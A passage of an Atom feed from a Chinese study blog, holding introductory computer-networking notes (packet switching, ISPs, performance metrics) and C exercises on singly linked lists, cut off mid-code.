    <content type="html"><![CDATA[<p><img src="https://i.loli.net/2021/09/29/8YW4KU7igu1OhPz.png" alt="image-20210929191834740"></p><p><img src="https://i.loli.net/2021/09/29/QhLMIUy9F2NGsKm.png" alt="image-20210929191855181"></p><h2 id="1-1-计算机网络在信息时代的作用"><a href="#1-1-计算机网络在信息时代的作用" class="headerlink" title="1.1 计算机网络在信息时代的作用"></a>1.1 计算机网络在信息时代的作用</h2><p>21世纪，数字化、网络化、信息化</p><p>网络化：三网——-电信网络、计算机网络、有线电视网络</p><p>计算机网络：因特网、其它网络（政府专用网络等等）</p><p><strong>计算机网络的重要功能：</strong></p><ul><li><p>连通性：彼此连接，交换信息</p></li><li><p>共享：信息共享、软硬件共享</p></li></ul><h2 id="1-2-因特网"><a href="#1-2-因特网" class="headerlink" title="1.2 因特网"></a>1.2 因特网</h2><p>网络：Network 结点（交换机 和 计算机） 与 链路 连接，许多计算机 通过 链路 连接在交换机上，之间的—— 交换机</p><p>互连网：internet  （Network of Networks） 连接  各个网络，网络与网络 通过路由器 相连 ——- 路由器</p><p>因特网：Internet   全球最大的互连网  TCP/IP</p><p><strong>因特网发展三个阶段：</strong></p><ul><li><p>ARPANET 向互连网 发展：</p><ul><li>1969 年，分组交换</li><li>1975 年，互联网</li><li>1983 年，因特网 TCP/IP，此时 是未开放的政府性质的网络</li></ul></li><li><p>三级结构的因特网</p><ul><li>1985 年，三个地区网（校园网等），一个主干网，地区网连接在主干网上</li></ul></li><li><p> 多层次 ISP 结构的因特网  （ISP  因特网服务提供商：端系统通过其连接在因特网）</p></li></ul><p>  由因特网管理机构 分配公网 IP 给 ISP ，然后 ISP 再分配给 端系统，同时 ISP 也是分级的 </p><p>  <img src="https://i.loli.net/2021/09/29/FdNSmQTnuh7VrR3.png" alt="image-20210929194601798"></p><p>选择本地运营商下载速度快</p><p><img src="https://i.loli.net/2021/09/29/HTCXe7l9iFucVGk.png" alt="image-20210929194930259"></p><p><img src="https://i.loli.net/2021/09/29/LZSN1lkznXMOhiE.png" alt="image-20210929195123493"></p><p><img src="https://i.loli.net/2021/09/29/ywlZ1kLFCsxuTmV.png" alt="image-20210929195256507"></p><h2 id="1-3-因特网的组成"><a href="#1-3-因特网的组成" class="headerlink" title="1.3 因特网的组成"></a>1.3 因特网的组成</h2><h3 id="1-3-1-核心部分"><a href="#1-3-1-核心部分" class="headerlink" title="1.3.1 核心部分"></a>1.3.1 核心部分</h3><p><strong>数据交换方式：</strong></p><ul><li><p><strong>电路交换 Circuit Switching</strong> ：面向连接</p><p>举例：打电话</p><ol><li>建立连接：申请占用通信资源（耗时）</li><li>通话过程：一直占用资源</li><li>释放连接：释放通信资源（不释放即为 占线）</li></ol><p>适用于：数据量很大的实时性传输；核心路由器之间可使用。</p></li><li><p><strong>报文交换 Message Switching</strong></p><p>报文比分组长（不分段）</p><p>报文交换的时间长</p><p>不建立连接</p></li><li><p><strong>分组交换 Packet Switching</strong>：计算机网络采用该方式实现数据通信</p><ol><li><p>发送端将需要传输的数据进行分组：每一个分组均由 首部（源地址、目标地址） 和 数据 两部分组成 </p></li><li><p>接收端 接收每个分组，去掉其首部保留数据，连接在一起，使数据完整</p></li><li><p>从发送端到接收端：进行分组的转发——由路由器进行选择最佳合适的路径进行转发    </p></li></ol><p>（路由器：存储、转发的功能    暂存、查找转发表、找到要转发的端口）</p><p>不需要建立连接，不占线 </p><p>优点：高效、迅速、可靠、灵活</p><p>缺点：时延、开销</p></li></ul><p><img src="https://i.loli.net/2021/09/29/nscfoZhNGtvegAX.png" alt="image-20210929201927140"></p><p><strong>耗时：报文 &gt; 电路 &gt; 分组</strong></p><h3 id="1-3-2-边缘部分"><a href="#1-3-2-边缘部分" class="headerlink" title="1.3.2 边缘部分"></a>1.3.2 边缘部分</h3><p><strong>主机之间的通信方式：</strong></p><ul><li><p><strong>C/S 客户服务器方式：Client/Server</strong></p><p>服务器是服务器，客户机是客户机</p></li><li><p><strong>P2P 对等方式：Peer-to-Peer</strong></p><p>客户机也可以是服务器，即是服务器也是客户机</p><p>例如：P2P 下载：可以从多个源上下载同一个文件，不需要仅仅从一个服务器上下载</p></li></ul><h2 id="1-4-计算机网络在我国的发展"><a href="#1-4-计算机网络在我国的发展" class="headerlink" title="1.4 计算机网络在我国的发展"></a>1.4 计算机网络在我国的发展</h2><p>1994 年 4 月 20 日，中国正式接入互连网</p><h2 id="1-5-计算机网络的类别"><a href="#1-5-计算机网络的类别" class="headerlink" title="1.5 计算机网络的类别"></a>1.5 计算机网络的类别</h2><p><img src="https://i.loli.net/2021/09/29/rn4oItQE9judziC.png" alt="image-20210929203028386"></p><p><img src="https://i.loli.net/2021/09/29/9VM6m7hXntDLwfl.png" alt="image-20210929202956297"></p><h2 id="1-6-计算机网络的性能"><a href="#1-6-计算机网络的性能" class="headerlink" title="1.6 计算机网络的性能"></a>1.6 计算机网络的性能</h2><p>速率：连接在计算机网络上的主机在数字信道上传送 <strong>数据位数</strong> 的速率  data rate   bit rate</p><p>b/s   kb/s   Mb/s   Gb/s</p><p>带宽：数据通信领域中，数字信道所能传送的最高数据率</p><p>b/s  kb/s  Mb/s  Gb/s</p><p>吞吐量：单位时间内通过某个网络（所有路径）的数据量</p><p>b/s  Mb/s</p><p>时延：发送时延、传播时延、处理时延、排队时延之和 </p><p>时延带宽积：传播时延 x 带宽 </p><p>往返时间：从发送端发送数据开始，到发送端收到接收端确认 为止   </p><p>利用率</p><ul><li>信道利用率：有数据通过时间/（有加无）数据通过的时间</li><li>网络利用率：信道利用率加权平均值</li></ul><p><img src="https://i.loli.net/2021/09/29/IvD1ObgQ6At9JTC.png" alt="image-20210929212908347"></p><p><strong>非性能指标：</strong></p><p>费用 、管理与维护、质量、标准化、可靠性、可扩展性、可升级性</p>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;&lt;img src=&quot;https://i.loli.net/2021/09/29/8YW4KU7igu1OhPz.png&quot; alt=&quot;image-20210929191834740&quot;&gt;&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://i.loli.net/2021/09/2</summary>
      
    
    
    
    <category term="计网" scheme="https://xizhi-future.github.io/categories/%E8%AE%A1%E7%BD%91/"/>
    
    
    <category term="计网" scheme="https://xizhi-future.github.io/tags/%E8%AE%A1%E7%BD%91/"/>
    
  </entry>
  
  <entry>
    <title>单链表、双链表练题</title>
    <link href="https://xizhi-future.github.io/2021/10/05/%E5%8D%95%E9%93%BE%E8%A1%A8%E3%80%81%E5%8F%8C%E9%93%BE%E8%A1%A8%E7%BB%83%E9%A2%98/"/>
    <id>https://xizhi-future.github.io/2021/10/05/%E5%8D%95%E9%93%BE%E8%A1%A8%E3%80%81%E5%8F%8C%E9%93%BE%E8%A1%A8%E7%BB%83%E9%A2%98/</id>
    <published>2021-10-05T11:51:44.000Z</published>
    <updated>2021-10-05T11:52:52.560Z</updated>
    
    <content type="html"><![CDATA[<p>[TOC]</p><h2 id="第三章-链式存储"><a href="#第三章-链式存储" class="headerlink" title="第三章  链式存储"></a>第三章  链式存储</h2><h3 id="1-设计一个算法，求一个单链表中的结点个数。"><a href="#1-设计一个算法，求一个单链表中的结点个数。" class="headerlink" title="1. 设计一个算法，求一个单链表中的结点个数。"></a>1. 设计一个算法，求一个单链表中的结点个数。</h3><p><strong>算法：</strong></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//计数</span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">count</span><span class="params">(node *head)</span></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> s = <span class="number">0</span>;</span><br><span class="line">    node *p = head;</span><br><span class="line">    <span class="keyword">while</span>(p)&#123;</span><br><span class="line">        p = p-&gt;next;</span><br><span class="line">        s++;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> s;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><strong>测试：</strong></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> FLAG 0</span></span><br><span class="line"><span class="keyword">typedef</span> <span class="keyword">int</span> datatype;</span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> <span class="title">link_node</span>&#123;</span></span><br><span class="line">    datatype info;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">link_node</span> *<span class="title">next</span>;</span></span><br><span class="line">&#125;node;</span><br><span class="line"></span><br><span class="line"><span class="comment">//前插法 创建单链表</span></span><br><span class="line"><span class="function">node *<span class="title">creat</span><span class="params">()</span></span>&#123;</span><br><span class="line">    node *head = <span class="literal">NULL</span>;</span><br><span class="line">    node *s;</span><br><span class="line">    <span class="keyword">int</span> x;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;请输入结点值：\n&quot;</span>);</span><br><span class="line">    <span class="built_in">scanf</span>(<span class="string">&quot;%d&quot;</span>,&amp;x);</span><br><span class="line">    <span class="keyword">while</span>( x!= FLAG)&#123;</span><br><span class="line">        s = (node*)<span class="built_in">malloc</span>(<span class="keyword">sizeof</span>(node));</span><br><span class="line">        s-&gt;info = x;</span><br><span class="line">        s-&gt;next = head;</span><br><span class="line">        head = s;</span><br><span class="line">        <span class="built_in">scanf</span>(<span class="string">&quot;%d&quot;</span>,&amp;x);</span><br><span class="line">    &#125;</span><br><span class="line"><span class="keyword">return</span> head;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//输出</span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">print</span><span class="params">(node *head)</span></span>&#123;</span><br><span class="line">    node *p = head;</span><br><span class="line">    <span class="keyword">if</span>(!p) &#123;<span class="built_in">printf</span>(<span class="string">&quot;链表是 空的！\n&quot;</span>);&#125;</span><br><span class="line">    <span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;单链表各个结点的值是：\n&quot;</span>);</span><br><span class="line">        <span class="keyword">while</span>(p)&#123;</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;%5d&quot;</span>,p-&gt;info);</span><br><span class="line">            p = p-&gt;next;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//计数</span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">count</span><span class="params">(node *head)</span></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> s = <span class="number">0</span>;</span><br><span class="line">    node *p = head;</span><br><span class="line">    <span class="keyword">while</span>(p)&#123;</span><br><span class="line">        p = p-&gt;next;</span><br><span class="line">        s++;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> s;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">    node *pt;</span><br><span class="line">    <span class="keyword">int</span> sum;</span><br><span class="line">    pt=creat();</span><br><span class="line">    print(pt);</span><br><span class="line">    sum = count(pt);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;\n\n该单链表中结点个数是：%d\n&quot;</span>,sum);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img src="https://i.loli.net/2021/10/03/g4NDwT3JfyEx7qI.png" alt="image-20211003114619188"></p><h3 id="2-设计一个算法，在一个单链表中值为y的结点前面插入一个值为x的结点。即使值为x的新结点成为值为y的结点的前驱结点。"><a href="#2-设计一个算法，在一个单链表中值为y的结点前面插入一个值为x的结点。即使值为x的新结点成为值为y的结点的前驱结点。" class="headerlink" title="2. 设计一个算法，在一个单链表中值为y的结点前面插入一个值为x的结点。即使值为x的新结点成为值为y的结点的前驱结点。"></a>2. 设计一个算法，在一个单链表中值为y的结点前面插入一个值为x的结点。即使值为x的新结点成为值为y的结点的前驱结点。</h3><p><strong>算法：</strong></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//在值为 y 的结点前插入 值为 x 的结点</span></span><br><span class="line"><span class="function">node *<span class="title">insert</span><span class="params">(node *head,datatype y,datatype x)</span></span>&#123;</span><br><span class="line">    node *p = head;</span><br><span class="line">node *q,*pre;</span><br><span class="line">    <span class="keyword">while</span>(p &amp;&amp; p-&gt;info != y)&#123;</span><br><span class="line">        pre = p;</span><br><span class="line">        p = p-&gt;next;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span>(!p) &#123;<span class="built_in">printf</span>(<span class="string">&quot;找不到值是%d的结点\n&quot;</span>,y);&#125;</span><br><span class="line">    <span class="keyword">else</span>&#123;</span><br><span class="line">        q = (node*)<span class="built_in">malloc</span>(<span class="keyword">sizeof</span>(node));</span><br><span class="line">    q-&gt;info = x;</span><br><span class="line">        q-&gt;next = p;</span><br><span class="line">        pre-&gt;next = q;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> head;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><strong>测试：</strong></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> FLAG 0</span></span><br><span class="line"><span class="keyword">typedef</span> <span class="keyword">int</span> datatype;</span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> <span class="title">link_node</span>&#123;</span></span><br><span class="line">    datatype info;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">link_node</span> *<span class="title">next</span>;</span></span><br><span class="line">&#125;node;</span><br><span class="line"></span><br><span class="line"><span class="comment">//创建单链表 前插法</span></span><br><span class="line"><span class="function">node *<span class="title">creat</span><span class="params">(<span class="keyword">void</span>)</span></span>&#123;</span><br><span class="line">    node *head = <span class="literal">NULL</span>;</span><br><span class="line">    node *s;</span><br><span class="line">    <span class="keyword">int</span> x;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;请输入结点值：\n&quot;</span>);</span><br><span class="line">    <span class="built_in">scanf</span>(<span class="string">&quot;%d&quot;</span>,&amp;x);</span><br><span class="line">    <span class="keyword">while</span>(x != FLAG)&#123;</span><br><span class="line">        s = (node*)<span class="built_in">malloc</span>(<span class="keyword">sizeof</span>(node));</span><br><span class="line">        s-&gt;info = x;</span><br><span class="line">        s-&gt;next = head;</span><br><span class="line">        head = s;</span><br><span class="line">        <span class="built_in">scanf</span>(<span class="string">&quot;%d&quot;</span>,&amp;x);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> head;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//输出</span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">print</span><span class="params">(node *head)</span></span>&#123;<span class="comment">//由于是 前插：所以输出的内容是与之前输入的顺序相反</span></span><br><span class="line">    node *p = head;</span><br><span class="line">    <span class="keyword">if</span>(!p) &#123;<span class="built_in">printf</span>(<span class="string">&quot;单链表是空的！\n&quot;</span>);&#125;</span><br><span class="line">    <span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;单链表各个结点的值是：\n&quot;</span>);</span><br><span class="line">        <span class="keyword">while</span>(p)&#123;</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;%5d&quot;</span>,p-&gt;info);</span><br><span class="line">            p = p-&gt;next;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//在值为 y 的结点前插入 值为 x 的结点</span></span><br><span class="line"><span class="function">node *<span class="title">insert</span><span class="params">(node *head,datatype y,datatype x)</span></span>&#123;</span><br><span class="line">    node *p = head;</span><br><span class="line">node *q,*pre;</span><br><span class="line">    <span class="keyword">while</span>(p &amp;&amp; p-&gt;info != y)&#123;</span><br><span class="line">        pre = p;</span><br><span class="line">        p = p-&gt;next;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span>(!p) &#123;<span class="built_in">printf</span>(<span class="string">&quot;找不到值是%d的结点\n&quot;</span>,y);&#125;</span><br><span class="line">    <span class="keyword">else</span>&#123;</span><br><span class="line">        q = (node*)<span class="built_in">malloc</span>(<span class="keyword">sizeof</span>(node));</span><br><span class="line">    q-&gt;info = x;</span><br><span class="line">        q-&gt;next = p;</span><br><span class="line">        pre-&gt;next = q;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> head;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">    node *pt;</span><br><span class="line">    pt = creat();</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;进行插入之前：\n&quot;</span>);</span><br><span class="line">    print(pt);</span><br><span class="line">    pt = insert(pt,<span class="number">11</span>,<span class="number">88</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;\n进行插入之后：\n&quot;</span>);</span><br><span class="line">    print(pt);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;\n&quot;</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img src="https://i.loli.net/2021/10/03/aZmS3FnQAdGk2y5.png" alt="image-20211003122007950"></p><h3 id="3-设计一个算法，判断一个单链表中各个结点值是否有序。"><a href="#3-设计一个算法，判断一个单链表中各个结点值是否有序。" class="headerlink" title="3. 设计一个算法，判断一个单链表中各个结点值是否有序。"></a>3. 设计一个算法，判断一个单链表中各个结点值是否有序。</h3><p><strong>算法：</strong></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//判断 单链表中 各结点值是否有序</span></span><br><span class="line"><span class="comment">//参数是 a ，为升序，参数为 b ，为降序</span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">judge_order</span><span class="params">(node *head,<span class="keyword">char</span> c)</span></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> flag = <span class="number">1</span>;</span><br><span class="line">    <span class="comment">//node *p = head-&gt;next;</span></span><br><span class="line">node *p = head;</span><br><span class="line">    <span class="keyword">switch</span>(c)&#123;</span><br><span class="line">        <span class="keyword">case</span> <span class="string">&#x27;a&#x27;</span>:</span><br><span class="line">            <span class="keyword">while</span>(p &amp;&amp; p-&gt;next &amp;&amp; flag)&#123;</span><br><span class="line">                <span class="keyword">if</span>(p-&gt;info &lt;= p-&gt;next-&gt;info)</span><br><span class="line">                    p = p-&gt;next;</span><br><span class="line">                <span class="keyword">else</span></span><br><span class="line">                    flag = <span class="number">0</span>;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">case</span> <span class="string">&#x27;b&#x27;</span>:</span><br><span class="line">            <span class="keyword">while</span>(p &amp;&amp; p-&gt;next &amp;&amp; flag)&#123;</span><br><span class="line">                <span class="keyword">if</span>(p-&gt;info &gt;= p-&gt;next-&gt;info)</span><br><span class="line">                    p = p-&gt;next;</span><br><span class="line">                <span class="keyword">else</span></span><br><span class="line">                    flag = <span class="number">0</span>;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> flag;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><strong>测试：</strong></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> FLAG 0</span></span><br><span class="line"><span class="keyword">typedef</span> <span class="keyword">int</span> datatype;</span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> <span class="title">link_node</span>&#123;</span></span><br><span class="line">    datatype  info;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">link_node</span> *<span class="title">next</span>;</span></span><br><span class="line">&#125;node;</span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">//创建单链表 前插法</span></span><br><span class="line"><span class="comment">node *creat_first(void)&#123;</span></span><br><span class="line"><span class="comment">    node *head = NULL;</span></span><br><span class="line"><span class="comment">    node *s;</span></span><br><span class="line"><span class="comment">    int x;</span></span><br><span class="line"><span class="comment">    printf(&quot;请输入各个结点的值：\n&quot;);</span></span><br><span class="line"><span class="comment">    scanf(&quot;%d&quot;,&amp;x);</span></span><br><span class="line"><span class="comment">    while(x != FLAG)&#123;</span></span><br><span class="line"><span class="comment">        s = (node*)malloc(sizeof(node));</span></span><br><span class="line"><span class="comment">        s-&gt;info = x;</span></span><br><span class="line"><span class="comment">        s-&gt;next = head;</span></span><br><span class="line"><span class="comment">        head = s;</span></span><br><span class="line"><span class="comment">        scanf(&quot;%d&quot;,&amp;x);</span></span><br><span class="line"><span class="comment">    &#125;</span></span><br><span class="line"><span class="comment">    return head;</span></span><br><span class="line"><span class="comment">&#125;</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"></span><br><span class="line"><span class="comment">//后插法 创建单链表</span></span><br><span class="line"><span class="function">node *<span class="title">creat_behind</span><span class="params">(<span class="keyword">void</span>)</span></span>&#123;</span><br><span class="line">    node *head = <span class="literal">NULL</span>;</span><br><span class="line">    node *r = <span class="literal">NULL</span>;</span><br><span class="line">    node *s;</span><br><span class="line">    <span class="keyword">int</span> x;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;请输出各个结点的值：\n&quot;</span>);</span><br><span class="line">    <span class="built_in">scanf</span>(<span class="string">&quot;%d&quot;</span>,&amp;x);</span><br><span class="line">    <span class="keyword">while</span>(x != FLAG)&#123;</span><br><span class="line">        s = (node*)<span class="built_in">malloc</span>(<span class="keyword">sizeof</span>(node));</span><br><span class="line">        s-&gt;info = x;</span><br><span class="line">        <span class="keyword">if</span>(!head)</span><br><span class="line">            head = s;</span><br><span class="line">        <span class="keyword">else</span></span><br><span class="line">            r-&gt;next = s;</span><br><span class="line">        r = s;</span><br><span class="line">        <span class="built_in">scanf</span>(<span class="string">&quot;%d&quot;</span>,&amp;x);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span>(r != <span class="literal">NULL</span>)&#123;</span><br><span class="line">        r-&gt;next = <span class="literal">NULL</span>;</span><br><span class="line">    &#125;</span><br><span class="line"><span class="keyword">return</span> head;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">//输出</span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">print</span><span class="params">(node 